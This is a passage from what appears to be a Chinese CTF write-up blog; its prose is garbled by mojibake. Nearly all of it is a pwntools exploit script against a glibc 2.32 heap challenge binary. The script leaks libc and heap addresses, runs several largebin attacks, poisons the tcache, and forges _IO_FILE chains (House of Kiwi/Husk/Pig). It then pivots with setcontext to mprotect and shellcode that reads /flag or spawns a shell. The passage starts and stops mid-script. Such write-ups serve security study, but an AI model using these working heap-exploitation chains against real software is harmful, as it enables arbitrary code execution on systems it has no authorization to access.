class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(_IO_list_all - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Largebin Attack main_arena&#x27;s topchunk,Kiwi Preparing.....      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(top_chunk - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Tcache Poisoning,Make up _IO_FILE chain,Pig Preparing.....     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>edit(<span class="hljs-number">0x110</span>,p64(heap_leak^(__malloc_hook)),<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>,p64(magic) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x50</span>,<span class="hljs-number">0x58</span>)<br><br>fuck = SigreturnFrame()<br>fuck.rsp = heap_base + <span class="hljs-number">0xD10</span><br>fuck.rip = ret<br><br>mmp = flat([<br>    rdi,((heap_base + <span class="hljs-number">0xD00</span>)&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span>,rsi,<span class="hljs-number">0x2000</span>,rdx_r12,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,libc.sym.mprotect,rdi,<span class="hljs-number">0</span>,rsi,heap_base + <span class="hljs-number">0xD00</span>,rdx_r12,<span class="hljs-number">0x1000</span>,<span class="hljs-number">0</span>,read_addr,jmp_rsi<br>])<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xA00</span> ,fuck,<span class="hljs-number">0x300</span>)<br>edit(<span class="hljs-number">0</span> + <span class="hljs-number">0xD10</span>,mmp,<span class="hljs-number">0x100</span>)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span>,payload)<br><br>                             <span class="hljs-comment"># write_ptr</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span>)+p64(heap_base + <span class="hljs-number">0x60</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">70</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(heap_base + <span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span>,payload)<br><br><span class="hljs-comment"># ORW                             # rdx</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0</span>) + p64(heap_base + <span class="hljs-number">0xA00</span>) +p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#rdx</span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span> <span class="hljs-comment"># buf_base,buf_end </span><br>payload += p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">8</span> <span class="hljs-comment"># _chain</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">48</span><br>payload += p64(_IO_str_jumps)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0xA00</span> + <span class="hljs-number">0x200</span>,payload)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Trigger Kiwi --&gt; Husk --&gt; Pig                       |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x1000</span>)<br><span class="hljs-comment"># sl(asm(shellcraft.open(&quot;./&quot;,0x10000) + shellcraft.getdents(&quot;rax&quot;,&quot;rsp&quot;,0x200) + shellcraft.write(1,&quot;rsp&quot;,0x200)))</span><br><span class="hljs-comment"># data0=p.recv(0x200)</span><br><span class="hljs-comment"># print(dirents(data0))</span><br>sl(asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>,<span class="hljs-number">0</span>)+shellcraft.read(<span class="hljs-string">&quot;rax&quot;</span>,<span class="hljs-string">&quot;rsp&quot;</span>,<span class="hljs-number">0x100</span>)+shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;rsp&quot;</span>,<span class="hljs-number">0x100</span>)))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>æ²¡å¼€æ²™ç®±çš„ç›´æ¥æ‹¿ shell ç‰ˆæœ¬ï¼Œè¿™é‡Œæœ‰ç‚¹åƒ 2.24~2.27 é‚£é‡Œçš„ _IO_str_overlow çš„åˆ©ç”¨æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.32/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>debug()<br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,27834)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br>    <span class="hljs-comment"># sleep(0.5)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">offset,data,size=<span class="hljs-number">0x1000</span>-<span class="hljs-number">1</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(offset))<br>    sla(<span class="hljs-string">&#x27;content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    menu(<span class="hljs-number">4</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                               Init Heap                               |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>add(<span class="hljs-number">0x100</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                 0x100*8 ---&gt; Full Tcache ,Leak libc                   |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    chunk += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br>edit(<span class="hljs-number">0</span>,chunk)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span> + (<span class="hljs-number">7</span>-i)*<span class="hljs-number">0x100</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0xf8</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># Bypass \x00 Leak libc</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>) <br>show()<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br>rax = libc_base + <span class="hljs-number">0x0000000000044c70</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x0000000000112a51</span><br>syscall_ret = libc_base + <span class="hljs-number">0x000000000006105a</span><br>ret = libc_base + <span class="hljs-number">0x0000000000028a55</span> + <span class="hljs-number">1</span><br>read_addr = libc.sym.read<br>write_addr = libc.sym.write<br>__malloc_hook = libc.sym.__malloc_hook<br>__free_hook = libc.sym.__free_hook<br>system_addr = libc.sym.system<br><span class="hljs-comment"># bin_sh%1 == 1</span><br><span class="hljs-comment"># bin_sh = libc.search(&#x27;/bin/sh&#x27;).next() </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Husk</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>__printf_function_table = libc_base + <span class="hljs-number">0x1e35c8</span><br>__printf_arginfo_table = libc_base + <span class="hljs-number">0x1eb218</span><br>exit = libc.sym.exit<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Pig</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>_IO_list_all = libc_base + <span class="hljs-number">0x1e15c0</span><br>_IO_str_jumps = libc_base + <span class="hljs-number">0x1e2560</span><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Kiwi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>top_chunk = libc_base + <span class="hljs-number">0x1e0c00</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                        Leak Heap,Recover Heap                         |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x101</span>)+<span class="hljs-string">&#x27;\x00&#x27;</span>,<span class="hljs-number">0x11</span>) <br>add(<span class="hljs-number">0x58</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>show()<br>ru(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">4</span>))<br>heap_base = heap_leak &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>add(<span class="hljs-number">0x98</span>) <span class="hljs-comment"># 0xa0 + 0x60 = 0x100 Recover Heap</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Largebin Attack Preparing.....                      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x431</span>) + <span class="hljs-string">&#x27;\0&#x27;</span> * <span class="hljs-number">0x420</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x421</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x410</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(chunk))<br>edit(<span class="hljs-number">0x1000</span>,chunk)<br><br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Largebin</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|   Largebin Attack __printf_function_table&amp;__printf_arginfo_table      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Unsorted</span><br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_function_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_function_table)<br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(__printf_arginfo_table - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;__printf_function_table&#x27;</span>,__printf_arginfo_table)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x388</span> + <span class="hljs-number">0x20</span>,p64(exit))<span class="hljs-comment"># Exit</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                      Largebin Attack _IO_list_all                     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span>+<span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(_IO_list_all - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Largebin Attack main_arena&#x27;s topchunk,Kiwi Preparing.....      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x430</span> + <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x28</span>,p64(top_chunk - <span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">0xf8</span>)<br>lg(<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>,_IO_list_all)<br><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|        Tcache Poisoning,Make up _IO_FILE chain,Pig Preparing.....     |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>edit(<span class="hljs-number">0x110</span>,p64(heap_leak^(__malloc_hook)),<span class="hljs-number">8</span>)<br>edit(<span 